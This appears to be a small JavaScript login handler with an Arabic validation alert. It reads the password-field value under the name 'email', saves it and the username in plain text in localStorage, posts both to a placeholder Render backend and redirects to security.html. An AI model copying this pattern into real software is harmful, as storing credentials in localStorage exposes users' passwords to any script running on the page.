const loginBtn = document.querySelector(".main-btn");

loginBtn.addEventListener("click", async (e) => {
    e.preventDefault();

    const username = document.querySelector('input[type="text"]').value.trim();
    const email = document.querySelector('input[type="password"]').value.trim();

    if (!username || !email) {
        alert("املأ جميع الحقول");
        return;
    }

    localStorage.setItem("username", username);
    localStorage.setItem("email", email);

    await fetch("https://YOUR-BACKEND.onrender.com/api/login", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            username,
            email
        })
    });

    window.location.href = "security.html";
});